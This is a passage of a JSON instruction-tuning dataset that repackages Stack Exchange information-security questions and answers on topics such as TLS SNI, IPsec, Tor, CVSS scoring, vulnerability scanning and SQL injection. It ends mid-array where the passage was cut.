[
  {
    "instruction": "Can you tell me the answer to: Does TLS have any way of exposing only the URI in a SSL-SSL proxy, or BlueCoat style appliance?\nI'm writing an experimental authentication protocol and need to see the unencrypted URI's of the HTTP Call, but want to provably show that I can't see the data.\nDoes any standard, or feature exist that allows me to receive a HTTPSCall where I can only see\n\nMy authentication string\nThe URI being accessed\n(nothing else, especially not the data)\n\nFrom a REST-full perspective, this feels like a security guard who can inspect the doors but not see what's inside.\nDoes any tunneling, or cleartext \"shared-variable\" exist that allows me to see those properties (like Wireshark, but I have a TCP socket).",
    "context": "",
    "output": "answer: If you are asking whether or not an HTTPS connection will show the unencrypted URL in the network data, then the answer is partially YES.\nContrary to the previously accepted answer, the URL does not get encrypted like the rest of the data.\nThe base URL (ex. amazon.com) will appear as Server Name Indication extension (SNI) unencrypted data. Only the base URL. amazon.com/books will only show amazon.com in the SNI, the /books and beyond will not.\nSNI exists to handle virtual hosted servers, multiple web sites hosted on the same IP address.\nYou can see this for yourself with a line capture. Fire up Wireshark (or whatever), go to a web site and look at the \"Client Hello\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does TLS have any way of exposing only the URI in a SSL-SSL proxy, or BlueCoat style appliance?\nI'm writing an experimental authentication protocol and need to see the unencrypted URI's of the HTTP Call, but want to provably show that I can't see the data.\nDoes any standard, or feature exist that allows me to receive a HTTPSCall where I can only see\n\nMy authentication string\nThe URI being accessed\n(nothing else, especially not the data)\n\nFrom a REST-full perspective, this feels like a security guard who can inspect the doors but not see what's inside.\nDoes any tunneling, or cleartext \"shared-variable\" exist that allows me to see those properties (like Wireshark, but I have a TCP socket).",
      "answer": "If you are asking whether or not an HTTPS connection will show the unencrypted URL in the network data, then the answer is partially YES.\nContrary to the previously accepted answer, the URL does not get encrypted like the rest of the data.\nThe base URL (ex. amazon.com) will appear as Server Name Indication extension (SNI) unencrypted data. Only the base URL. amazon.com/books will only show amazon.com in the SNI, the /books and beyond will not.\nSNI exists to handle virtual hosted servers, multiple web sites hosted on the same IP address.\nYou can see this for yourself with a line capture. Fire up Wireshark (or whatever), go to a web site and look at the \"Client Hello\"."
    }
  },
  {
    "instruction": "Can you tell me the answer to: If a provider sees the last 4 characters of my password, can they see it in full?\nI have some domains/websites as well as emails with Bluehost.  Every time I need support, they need the last 4 characters of my main password for the account.  They cannot tell me how they store the password, so  I am intrigued in how they could safely store my password(s) and still see the last 4 characters. Do they see the full password in plain text?",
    "context": "",
    "output": "answer: It is always hard to answer such questions since we are not in Bluehost's secrets, so we can only guess and make suppositions.\nHowever, the behavior you describe remains possible without storing any clear form password:\n\nWhen you create a new account or reset your password, the password is sent to the server, most likely in clear form protected by TLS,\nThe server will then generate two different hashes for the same password:\n\n\nThe first hash takes your full password and is used for usual authentication,\nThe second hash takes only your password's four last characters,\n\nWhen you contact their support team, you tell them your last four characters, they type them on their software, then their software will internally calculate a hash, check it and display the result to the support technician.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "If a provider sees the last 4 characters of my password, can they see it in full?\nI have some domains/websites as well as emails with Bluehost.  Every time I need support, they need the last 4 characters of my main password for the account.  They cannot tell me how they store the password, so  I am intrigued in how they could safely store my password(s) and still see the last 4 characters. Do they see the full password in plain text?",
      "answer": "It is always hard to answer such questions since we are not in Bluehost's secrets, so we can only guess and make suppositions.\nHowever, the behavior you describe remains possible without storing any clear form password:\n\nWhen you create a new account or reset your password, the password is sent to the server, most likely in clear form protected by TLS,\nThe server will then generate two different hashes for the same password:\n\n\nThe first hash takes your full password and is used for usual authentication,\nThe second hash takes only your password's four last characters,\n\nWhen you contact their support team, you tell them your last four characters, they type them on their software, then their software will internally calculate a hash, check it and display the result to the support technician."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow can I check whether file modified time has been spoofed on ext4?\nOn Debian based system (Ubuntu 14.04.3 server specifically), using ext4 filesystem.\nHow would I discover if files have been changed, but the modified times have been made to look like the files have not been tampered with?\nI'm most interested in a way to check whether this has already happened, rather than using a tool which checks whether it happens from now on.",
    "context": "",
    "output": "Host Intrusion Detection Systems (HIDS) can offer this feature : File integrity checking.\nI don't try it personnaly but according to the documentation AIDE can do this.\nThe idea is to create hash values of the files you want to verify they don't change then compare them regularly with new calculated values.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I check whether file modified time has been spoofed on ext4?\nOn Debian based system (Ubuntu 14.04.3 server specifically), using ext4 filesystem.\nHow would I discover if files have been changed, but the modified times have been made to look like the files have not been tampered with?\nI'm most interested in a way to check whether this has already happened, rather than using a tool which checks whether it happens from now on.",
      "answer": "Host Intrusion Detection Systems (HIDS) can offer this feature : File integrity checking.\nI don't try it personnaly but according to the documentation AIDE can do this.\nThe idea is to create hash values of the files you want to verify they don't change then compare them regularly with new calculated values."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow does IPSec protect against IP spoofing?\nIPsec is a security mechanism that provides peer-entity authentication, data-origin\nauthentication, data integrity, and optionally data con\ufb01dentiality. It relies on extensions\nto the standard IP header layout and an additional protocol.\nThe security services that IPSec can provide are:\n\nAuthorization\u2013access control;\nConnectionless data integrity;\nData-origin authentication;\nPeer-entity authentication;\nRejection of replayed packets;\nCon\ufb01dentiality (encryption); and\nLimited traf\ufb01c \ufb02ow con\ufb01dentiality.\n\nI am unsure how this relates to protection against IP spoofing.",
    "context": "",
    "output": "A: The simplest answer is that negotiating an IPSec connection requires mutual authentication, which is a way to prove the identity of the entity behind the IP address.  All subsequent communications are cryptographically sound, such that there's no way you can carry on those communications unless you went through the mutual authentication phase.  An attacker can spoof the IP - but they can't convince the other party to trust that IP unless they compromise the credentials used.\nIt's more complex than that, of course, but that's the gist of it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does IPSec protect against IP spoofing?\nIPsec is a security mechanism that provides peer-entity authentication, data-origin\nauthentication, data integrity, and optionally data con\ufb01dentiality. It relies on extensions\nto the standard IP header layout and an additional protocol.\nThe security services that IPSec can provide are:\n\nAuthorization\u2013access control;\nConnectionless data integrity;\nData-origin authentication;\nPeer-entity authentication;\nRejection of replayed packets;\nCon\ufb01dentiality (encryption); and\nLimited traf\ufb01c \ufb02ow con\ufb01dentiality.\n\nI am unsure how this relates to protection against IP spoofing.",
      "answer": "The simplest answer is that negotiating an IPSec connection requires mutual authentication, which is a way to prove the identity of the entity behind the IP address.  All subsequent communications are cryptographically sound, such that there's no way you can carry on those communications unless you went through the mutual authentication phase.  An attacker can spoof the IP - but they can't convince the other party to trust that IP unless they compromise the credentials used.\nIt's more complex than that, of course, but that's the gist of it."
    }
  },
  {
    "instruction": "Question: Is OpenVas an active or passive scanner?\nI am using Ossim and I did a scan vulnerabilities with OpenVas. I received feedback that some of our softwares broke after the scan. We will check the logs to see if the scan cause this, but I was wondering: \nis OpenVas an active scanner? What are the risks associate with a tool like that?",
    "context": "",
    "output": "Answer: With the default Configuration OpenVAS will scan actively. It happend to me sometimes in the past that software crashed while scanning it with a vulnerablity scanner. In my expience this applies mostly to badly written PHP apps, IoT devices and cheap routers but of cause it can happen with other targets too.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is OpenVas an active or passive scanner?\nI am using Ossim and I did a scan vulnerabilities with OpenVas. I received feedback that some of our softwares broke after the scan. We will check the logs to see if the scan cause this, but I was wondering: \nis OpenVas an active scanner? What are the risks associate with a tool like that?",
      "answer": "With the default Configuration OpenVAS will scan actively. It happend to me sometimes in the past that software crashed while scanning it with a vulnerablity scanner. In my expience this applies mostly to badly written PHP apps, IoT devices and cheap routers but of cause it can happen with other targets too."
    }
  },
  {
    "instruction": "Does a buffer overflow vulnerability always mean a code execution vulnerability?\nSince buffer overflows always let an evil hacker write outside the buffer and overwrite the return pointer to a shellcode the evil hacker can place, does it mean that successful exploitation of a stack buffer overflow always means the ability to invoke a shell if done the right way? At least in theory, if you assume that DEP and ASLR is not in place.",
    "context": "",
    "output": "Douglas gives a correct answer. Not all buffer overflows give code execution. However, I felt it was missing a very important caution. \nEven if a buffer overflow does not allow arbitrary code execution, that does not mean that it is safe.\nA write buffer overflow lets you write to data that you are not supposed to. That data being a function address is just a special case. For example, suppose I have a user struct that has fields for name and privilege. It is easy to imagine how setting my name to \"JosiahhasaverylongnameAdmin\" could exploit a serious vulnerability, without any arbitrary code execution.\nFor another real world example, if you remember Heartbleed, that is a buffer overflow. It is just a read overflow rather than a write overflow. No chance of a code execution there, but a devastating breach of confidentiality even so.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does a buffer overflow vulnerability always mean a code execution vulnerability?\nSince buffer overflows always let an evil hacker write outside the buffer and overwrite the return pointer to a shellcode the evil hacker can place, does it mean that successful exploitation of a stack buffer overflow always means the ability to invoke a shell if done the right way? At least in theory, if you assume that DEP and ASLR is not in place.",
      "answer": "Douglas gives a correct answer. Not all buffer overflows give code execution. However, I felt it was missing a very important caution. \nEven if a buffer overflow does not allow arbitrary code execution, that does not mean that it is safe.\nA write buffer overflow lets you write to data that you are not supposed to. That data being a function address is just a special case. For example, suppose I have a user struct that has fields for name and privilege. It is easy to imagine how setting my name to \"JosiahhasaverylongnameAdmin\" could exploit a serious vulnerability, without any arbitrary code execution.\nFor another real world example, if you remember Heartbleed, that is a buffer overflow. It is just a read overflow rather than a write overflow. No chance of a code execution there, but a devastating breach of confidentiality even so."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow is Tor secure despite being open source?\nIf Tor is open source (and thus its process of concealing your IP is known), then how does it keep anything secure? Couldn't someone look at the source code and figure out how to reverse the routing process used to hide your IP address?\nI'm sure this has been thought of: I'm just curious how it's been dealt with.",
    "context": "",
    "output": "I'll take a crack at explaining this without technical jargon.\nLets say you want to send a nasty letter to someone, but you'd rather not deliver the letter in person for fear that they might get angry with you.\nYou can ask a courier to take the letter from your house, and deliver it to the recipient, right? That works, but has the problem that the courier knows both identities, and an evil courier could snitch on you.\nYou could use two couriers, and instruct the first to pass it on to the second, and instruct the second to pass it on to the recipient. That almost works, because now you are the only person that knows both endpoints to the conversation. Courier A knows you and courier B, while courier B knows courier A and the recipient;\nYou --- A --- B --- Recipient\n\nAnd just to decrease the chances of getting a bad circuit (when all couriers are evil and working together), Tor uses 3 couriers, so add a 'C' to that diagram in your head.\nThere is one problem remaining; how do we deliver the instructions to each courier without revealing our identity? If you wrote 'pass to B' on one piece of paper, you can give that to courier A alongside your nasty letter, but any instructions you send along with it, A can also read, and will therefore know the identities of everyone on the circuit.\nTor solves this final problem with repeated encryption, encrypting the message and instructions repeatedly, once for each courier. In terms of our analogy, this is what you do;\n\nPut your nasty letter in a red box alongside a piece of paper saying 'pass to recipient'.\n\nLock the red box with the key belonging to courier C.\n\nPut the red box inside a blue box alongside a piece of paper saying 'pass to C'.\n\nLock the blue box with the key belonging to courier B.\n\nPut the blue box inside a green box alongside a piece of paper saying 'pass to B'.\n\nLock the green box with the key belonging to courier A and pass it to him.\n\n\n\nIf you follow this through, you will see that none of the couriers can ever have knowledge of the full circuit, and there is no way for the recipient to find out that you sent the nasty letter.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is Tor secure despite being open source?\nIf Tor is open source (and thus its process of concealing your IP is known), then how does it keep anything secure? Couldn't someone look at the source code and figure out how to reverse the routing process used to hide your IP address?\nI'm sure this has been thought of: I'm just curious how it's been dealt with.",
      "answer": "I'll take a crack at explaining this without technical jargon.\nLets say you want to send a nasty letter to someone, but you'd rather not deliver the letter in person for fear that they might get angry with you.\nYou can ask a courier to take the letter from your house, and deliver it to the recipient, right? That works, but has the problem that the courier knows both identities, and an evil courier could snitch on you.\nYou could use two couriers, and instruct the first to pass it on to the second, and instruct the second to pass it on to the recipient. That almost works, because now you are the only person that knows both endpoints to the conversation. Courier A knows you and courier B, while courier B knows courier A and the recipient;\nYou --- A --- B --- Recipient\n\nAnd just to decrease the chances of getting a bad circuit (when all couriers are evil and working together), Tor uses 3 couriers, so add a 'C' to that diagram in your head.\nThere is one problem remaining; how do we deliver the instructions to each courier without revealing our identity? If you wrote 'pass to B' on one piece of paper, you can give that to courier A alongside your nasty letter, but any instructions you send along with it, A can also read, and will therefore know the identities of everyone on the circuit.\nTor solves this final problem with repeated encryption, encrypting the message and instructions repeatedly, once for each courier. In terms of our analogy, this is what you do;\n\nPut your nasty letter in a red box alongside a piece of paper saying 'pass to recipient'.\n\nLock the red box with the key belonging to courier C.\n\nPut the red box inside a blue box alongside a piece of paper saying 'pass to C'.\n\nLock the blue box with the key belonging to courier B.\n\nPut the blue box inside a green box alongside a piece of paper saying 'pass to B'.\n\nLock the green box with the key belonging to courier A and pass it to him.\n\n\n\nIf you follow this through, you will see that none of the couriers can ever have knowledge of the full circuit, and there is no way for the recipient to find out that you sent the nasty letter."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is there an equivalent of 'Run trace' as in OllyDbg for IDA PRO?\nI have been looking for the equivalent of the \"Run Trace\" option of OllyDbg in IDA Pro. Can anyone mention if there is one and how to use it ?",
    "context": "",
    "output": "answer: IDA Pro offers two tracing options:\n\nInstruction tracing Debugger->Tracing->Instruction Tracing It is very slow tracing process, since IDA monitors registers and has to record the address, the instruction, and changes values of registers, that were changed by the instruction.\nFunction tracing Debugger->Tracing->Function Tracing. It is a subcategory of instruction tracing, where only function calls are logged. \n\nThere are also three types of tracing events: execution traces, write traces, and read/write traces. \nA trace in IDA Pro could by replayed by using Trace replayer. It is located within Debuggers submenu. You could switch to Trace-replayer by going to Debugger->Switch Debugger...->Trace replayer\n\nOne thing to remember that you have to have trace created before you can replay it. In order to create a trace you will need to do the following:\n\nSet a breakpoint at the point where you want you trace started. \nRun the program with the debugger of your choice. \nWhenever it breaks, select desired tracing style (Instruction or Function)\nRun as far as necessary. You could set a second breakpoint to stop the trace.\nYou can optionally save the trace.\nReplay the trace by switching debugger to Trace replayer.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there an equivalent of 'Run trace' as in OllyDbg for IDA PRO?\nI have been looking for the equivalent of the \"Run Trace\" option of OllyDbg in IDA Pro. Can anyone mention if there is one and how to use it ?",
      "answer": "IDA Pro offers two tracing options:\n\nInstruction tracing Debugger->Tracing->Instruction Tracing It is very slow tracing process, since IDA monitors registers and has to record the address, the instruction, and changes values of registers, that were changed by the instruction.\nFunction tracing Debugger->Tracing->Function Tracing. It is a subcategory of instruction tracing, where only function calls are logged. \n\nThere are also three types of tracing events: execution traces, write traces, and read/write traces. \nA trace in IDA Pro could by replayed by using Trace replayer. It is located within Debuggers submenu. You could switch to Trace-replayer by going to Debugger->Switch Debugger...->Trace replayer\n\nOne thing to remember that you have to have trace created before you can replay it. In order to create a trace you will need to do the following:\n\nSet a breakpoint at the point where you want you trace started. \nRun the program with the debugger of your choice. \nWhenever it breaks, select desired tracing style (Instruction or Function)\nRun as far as necessary. You could set a second breakpoint to stop the trace.\nYou can optionally save the trace.\nReplay the trace by switching debugger to Trace replayer."
    }
  },
  {
    "instruction": "Answer the following question:\n\nDoes the HTML password field include any protection against XHR/AJAX exfiltration?\nIn HTML when we describe a certain field as a password field is it somehow secured against sending out the data via XHR/AJAX/similar technologies?\nThis is relevant in case we have to deal with script injection and similar attacks.\nAccording to this question the protection is done on the client-side and only protects against physical viewing of the password, is that correct? It's hard to tell from the lack of information and it is only a blind assumption.\nP.S This question has nothing to do with locally stored passwords in the browser.",
    "context": "",
    "output": "Using type=\"password\" in HTML only prevents shoulder-surfing by obscuring the typed characters on the screen.  The actual password is available to any code that can access the document object model, and, in the absence of a TLS connection, is sent to the server in the clear.\nAlthough not directly related to the question, I have to add that \"client-side encryption\" is useless.  The \"encrypted\" value is available through the DOM, and as far as the server is concerned, that is the password.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does the HTML password field include any protection against XHR/AJAX exfiltration?\nIn HTML when we describe a certain field as a password field is it somehow secured against sending out the data via XHR/AJAX/similar technologies?\nThis is relevant in case we have to deal with script injection and similar attacks.\nAccording to this question the protection is done on the client-side and only protects against physical viewing of the password, is that correct? It's hard to tell from the lack of information and it is only a blind assumption.\nP.S This question has nothing to do with locally stored passwords in the browser.",
      "answer": "Using type=\"password\" in HTML only prevents shoulder-surfing by obscuring the typed characters on the screen.  The actual password is available to any code that can access the document object model, and, in the absence of a TLS connection, is sent to the server in the clear.\nAlthough not directly related to the question, I have to add that \"client-side encryption\" is useless.  The \"encrypted\" value is available through the DOM, and as far as the server is concerned, that is the password."
    }
  },
  {
    "instruction": "Q: Malware known to use port knocking to evade detection by network scanners?\nAre there any known cases of malware in the wild that utilize port knocking on a backdoor to evade detection by network scanners?",
    "context": "",
    "output": " A: Sebastein Jeanquier's Master's thesis section 7.1, \"Port Knocking in Malware (Backdoors)\", states that SAdoor and its predecessor cd00r both used this feature.\nTony Bradley writes in About.com that \"malware writers of the world have unfortunately ... begun to adopt  this technique for opening backdoors on victimized systems\" but doesn't provide any examples.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Malware known to use port knocking to evade detection by network scanners?\nAre there any known cases of malware in the wild that utilize port knocking on a backdoor to evade detection by network scanners?",
      "answer": "Sebastein Jeanquier's Master's thesis section 7.1, \"Port Knocking in Malware (Backdoors)\", states that SAdoor and its predecessor cd00r both used this feature.\nTony Bradley writes in About.com that \"malware writers of the world have unfortunately ... begun to adopt  this technique for opening backdoors on victimized systems\" but doesn't provide any examples."
    }
  },
  {
    "instruction": "Q: How does malicious software encrypt victims' files so quickly?\nEncrypting a file to me is akin to dealing with a very long string, feeding it into the hashing or encryption function to get another long encrypted string (or a hash in the case of hashing).\nThis process takes some good amount of time. I know that because I use HashTab to verify the integrity of the files I download off the Internet.  \nHow can ransomware like CTB-Locker or Crypt0l0cker encrypt their victims files instantly?\nRecently a friend of mine was a victim of one of these ransomware and he could NOT open his files/photos from Ubuntu on his dual-OS machine even when the infection happened with MSWindows. This suggests the encryption does not happen on the fly when you open a file.",
    "context": "",
    "output": " A: The mistake you are making is thinking it's instant.  Rather the malware sits there encrypting in the background and decrypting anything the user asks for.  It's silent during this phase, it only demands the ransom after everything has been encrypted.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does malicious software encrypt victims' files so quickly?\nEncrypting a file to me is akin to dealing with a very long string, feeding it into the hashing or encryption function to get another long encrypted string (or a hash in the case of hashing).\nThis process takes some good amount of time. I know that because I use HashTab to verify the integrity of the files I download off the Internet.  \nHow can ransomware like CTB-Locker or Crypt0l0cker encrypt their victims files instantly?\nRecently a friend of mine was a victim of one of these ransomware and he could NOT open his files/photos from Ubuntu on his dual-OS machine even when the infection happened with MSWindows. This suggests the encryption does not happen on the fly when you open a file.",
      "answer": "The mistake you are making is thinking it's instant.  Rather the malware sits there encrypting in the background and decrypting anything the user asks for.  It's silent during this phase, it only demands the ransom after everything has been encrypted."
    }
  },
  {
    "instruction": "Answer the following question:\n\nCVSS 3.1 -- does a scope change imply at the very least a low confidentiality impact?\nSo I'm looking at scoring a vulnerability, and I'm waffling on how to handle Scope and Confidentiality impact.\nIf scope is changed, isn't confidentiality-impact necessarily changed to at least Low? If I can get into a scope I shouldn't have access to, I can definitely get information I shouldn't have access to, correct?",
    "context": "",
    "output": "Hmm, I'm trying to think up a counter-example. Say you have a blind SSRF -- I can cause the server to send a request of my choosing to a host of my choosing within its LAN, but I can't see the response. That's definitely a scope change because I'm jumping from the host I'm allowed to talk to to one that I'm not. But it's not a confidentiality issue because I can't get any information out.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "CVSS 3.1 -- does a scope change imply at the very least a low confidentiality impact?\nSo I'm looking at scoring a vulnerability, and I'm waffling on how to handle Scope and Confidentiality impact.\nIf scope is changed, isn't confidentiality-impact necessarily changed to at least Low? If I can get into a scope I shouldn't have access to, I can definitely get information I shouldn't have access to, correct?",
      "answer": "Hmm, I'm trying to think up a counter-example. Say you have a blind SSRF -- I can cause the server to send a request of my choosing to a host of my choosing within its LAN, but I can't see the response. That's definitely a scope change because I'm jumping from the host I'm allowed to talk to to one that I'm not. But it's not a confidentiality issue because I can't get any information out."
    }
  },
  {
    "instruction": "Please answer this question: With reference to using Gpg4win, which is better: OpenPGP or S/MIME?\nWhich is better -- OpenPGP or S/MIME for higher security?",
    "context": "",
    "output": "One is no more better than the other than blinds are better than drapes. Both PGP and S/MIME are implementations of asymmetric key encryption. Both are used for digital signatures and encryption. From a cryptographic point of view, in the general case one isn't really any better than the other. Often the same cryptographic algorithms are used in both situations.\nThe real difference occurs when you decide what problems you are actually trying to solve, what other technologies are involved, and what business processes you either have in place or are capable of putting in place. When choosing between PGP or S/MIME those are the questions you need to ask yourself.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "With reference to using Gpg4win, which is better: OpenPGP or S/MIME?\nWhich is better -- OpenPGP or S/MIME for higher security?",
      "answer": "One is no more better than the other than blinds are better than drapes. Both PGP and S/MIME are implementations of asymmetric key encryption. Both are used for digital signatures and encryption. From a cryptographic point of view, in the general case one isn't really any better than the other. Often the same cryptographic algorithms are used in both situations.\nThe real difference occurs when you decide what problems you are actually trying to solve, what other technologies are involved, and what business processes you either have in place or are capable of putting in place. When choosing between PGP or S/MIME those are the questions you need to ask yourself."
    }
  },
  {
    "instruction": "Question: What is the difference between Federated Login and Single Sign On?\nWhat is the difference between Federated Login and Single Sign On authentication methods?",
    "context": "",
    "output": "Answer: SSO allows a single authentication credential--user ID and password, smart card, one-time password token or a biometric device--to access multiple or different systems within a single organization. A federated identity management system provides single access to multiple systems across different enterprises.\nsource",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between Federated Login and Single Sign On?\nWhat is the difference between Federated Login and Single Sign On authentication methods?",
      "answer": "SSO allows a single authentication credential--user ID and password, smart card, one-time password token or a biometric device--to access multiple or different systems within a single organization. A federated identity management system provides single access to multiple systems across different enterprises.\nsource"
    }
  },
  {
    "instruction": "Answer this question:\n\nIs it okay for our IT support contractor to remote in without authorization?\nWe are a healthcare IT company.  My machine has PHI on it.  Our IT contractor verbally asked if he could remote in to fix my printer so I said sure.  I expected some sort of prompt to allow it but he was just in.  Some form of VNC I guess.\nIs this okay?  In regards to HIPAA?",
    "context": "",
    "output": "A: You haven't actually provided enough details to say one way or the other.  The fact that you didn't see an authentication prompt doesn't preclude there from being one.\nThe remote access tools I use in my job (which also deals with HIPAA) both require me to authenticate with my domain admin credentials and do not prompt users to accept the connection, because I've configured them that way.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it okay for our IT support contractor to remote in without authorization?\nWe are a healthcare IT company.  My machine has PHI on it.  Our IT contractor verbally asked if he could remote in to fix my printer so I said sure.  I expected some sort of prompt to allow it but he was just in.  Some form of VNC I guess.\nIs this okay?  In regards to HIPAA?",
      "answer": "You haven't actually provided enough details to say one way or the other.  The fact that you didn't see an authentication prompt doesn't preclude there from being one.\nThe remote access tools I use in my job (which also deals with HIPAA) both require me to authenticate with my domain admin credentials and do not prompt users to accept the connection, because I've configured them that way."
    }
  },
  {
    "instruction": "Answer the question below.\nIDA show xrefs in .pdata and nothing else\nI'm debugging the Windows ARM64 version's EFI (bootaa64.efi).\nUsing QEMU and GDB I was able to find that bootaa64.efi was stuck in one of the two functions BlKernelSp0SystemErrorHandler and BlKernelExceptionHandler. The image below is two functions when I load bootaa64.efi to IDA.\n\nI'm not really good at ARM64 assembly but I recognized these functions are just forever loops.\nThe code stuck in that loop means somehow the function is called. But IDA just show two xref, one is the function call itself (loop) and the other is .pdata xref:\nI want to know what called these functions. Thanks!",
    "context": "",
    "output": "These functions look like exception handlers and are probably \u201ccalled\u201d by the processor when an exception or a fault happens. You need to inspect system registers to determine the cause of the exception and where it happened. See the ARM manuals for more information.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "IDA show xrefs in .pdata and nothing else\nI'm debugging the Windows ARM64 version's EFI (bootaa64.efi).\nUsing QEMU and GDB I was able to find that bootaa64.efi was stuck in one of the two functions BlKernelSp0SystemErrorHandler and BlKernelExceptionHandler. The image below is two functions when I load bootaa64.efi to IDA.\n\nI'm not really good at ARM64 assembly but I recognized these functions are just forever loops.\nThe code stuck in that loop means somehow the function is called. But IDA just show two xref, one is the function call itself (loop) and the other is .pdata xref:\nI want to know what called these functions. Thanks!",
      "answer": "These functions look like exception handlers and are probably \u201ccalled\u201d by the processor when an exception or a fault happens. You need to inspect system registers to determine the cause of the exception and where it happened. See the ARM manuals for more information."
    }
  },
  {
    "instruction": "SQL injection in Windows Services?\nI have many Windows services which run on the server side only. It performs few CRUD operations on a database (MySQL).\nThere is a client application which allows a user to upload files through it to the server. When the file gets uploaded to the server, Window Service performs required operations on this file and update the details in Database through SQL queries.\nClient App(Desktop App) -> File -> Upload on Server -> Window Service Process File -> Database Entry\nI was wondering if such kind of architecture really requires\nparameterized query to prevent SQL injection?",
    "context": "",
    "output": "Parameterized queries are a good idea in almost every case.\nAll it takes is one mistake in the service which processes the uploaded file and you could have SQL injection issues. \nSecurity is about defense in depth, meaning you use several layers of security in case there's a hole in another part of your system.  I would recommend following best practices for SQL queries.  In the end it's not strictly required, but it would present an unnecessary risk considering how little effort it takes to parameterize queries. \nIt can also improve code readability by eliminating the constant opening, closing, and appending of strings where it's easy to miss quotes for a string type parameter.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "SQL injection in Windows Services?\nI have many Windows services which run on the server side only. It performs few CRUD operations on a database (MySQL).\nThere is a client application which allows a user to upload files through it to the server. When the file gets uploaded to the server, Window Service performs required operations on this file and update the details in Database through SQL queries.\nClient App(Desktop App) -> File -> Upload on Server -> Window Service Process File -> Database Entry\nI was wondering if such kind of architecture really requires\nparameterized query to prevent SQL injection?",
      "answer": "Parameterized queries are a good idea in almost every case.\nAll it takes is one mistake in the service which processes the uploaded file and you could have SQL injection issues. \nSecurity is about defense in depth, meaning you use several layers of security in case there's a hole in another part of your system.  I would recommend following best practices for SQL queries.  In the end it's not strictly required, but it would present an unnecessary risk considering how little effort it takes to parameterize queries. \nIt can also improve code readability by eliminating the constant opening, closing, and appending of strings where it's easy to miss quotes for a string type parameter."
    }
  },
  {
    "instruction": "Answer this question:\n\nIs unauthorised deletion an integrity or availability issue?\nDuring a web application test I have discovered a parameter tampering issue that allows a user to delete comments left by other users. They can't modify the content of other users' comments, and they can only view them where this is intentional.\nI'm now calculating the CVSS score using this calculator. It's pretty clear that the confidentiality impact is none, but I'm unclear about the others.\nSo my question is: for the purpose of CVSSv3, is unauthorised deletion an integrity issue, or an availability issue (or both) ?",
    "context": "",
    "output": "A: I would say it presents a clear Availability issue as the attacker is able to completely remove that specific resource and prevent other users' ability to access. \nI would also say there is an Integrity issue too. The calculator defines a low score on integrity as \"modification of data is possible\" which I would say is certainly the case here. \nTo answer your question : Both. How you score depends on how important those comments are to your application.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is unauthorised deletion an integrity or availability issue?\nDuring a web application test I have discovered a parameter tampering issue that allows a user to delete comments left by other users. They can't modify the content of other users' comments, and they can only view them where this is intentional.\nI'm now calculating the CVSS score using this calculator. It's pretty clear that the confidentiality impact is none, but I'm unclear about the others.\nSo my question is: for the purpose of CVSSv3, is unauthorised deletion an integrity issue, or an availability issue (or both) ?",
      "answer": "I would say it presents a clear Availability issue as the attacker is able to completely remove that specific resource and prevent other users' ability to access. \nI would also say there is an Integrity issue too. The calculator defines a low score on integrity as \"modification of data is possible\" which I would say is certainly the case here. \nTo answer your question : Both. How you score depends on how important those comments are to your application."
    }
  },
  {
    "instruction": "Please answer this question: Is there any disadvantage in using OpenNIC for DNS resolution?\nWhat are the advantages/disadvantages of OpenNIC vs ISP for DNS resolution with regards to security and privacy?",
    "context": "",
    "output": "NameBench is a Google engineer's side project.  It can test a large number of DNS servers to make sure that their resolution is \"safe\", and not a source of censorship.  It will try and resolve common domain names like www.paypal.com, and make sure that they are pointing to the right location.  (Not of the censorship checks are working properly at the time of this writing,  but this feature still works.)\nNamebench also performs speed checks.  When I ran it i found out that level3's DNS resolution servers where on average 4 times as fast as the ones provided by my ISP. Also my ISP was maliciously redirecting failed DNS lookups to a spam page,  which is why I was looking to replace them in the first place.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any disadvantage in using OpenNIC for DNS resolution?\nWhat are the advantages/disadvantages of OpenNIC vs ISP for DNS resolution with regards to security and privacy?",
      "answer": "NameBench is a Google engineer's side project.  It can test a large number of DNS servers to make sure that their resolution is \"safe\", and not a source of censorship.  It will try and resolve common domain names like www.paypal.com, and make sure that they are pointing to the right location.  (Not of the censorship checks are working properly at the time of this writing,  but this feature still works.)\nNamebench also performs speed checks.  When I ran it i found out that level3's DNS resolution servers where on average 4 times as fast as the ones provided by my ISP. Also my ISP was maliciously redirecting failed DNS lookups to a spam page,  which is why I was looking to replace them in the first place."
    }
  },
  {
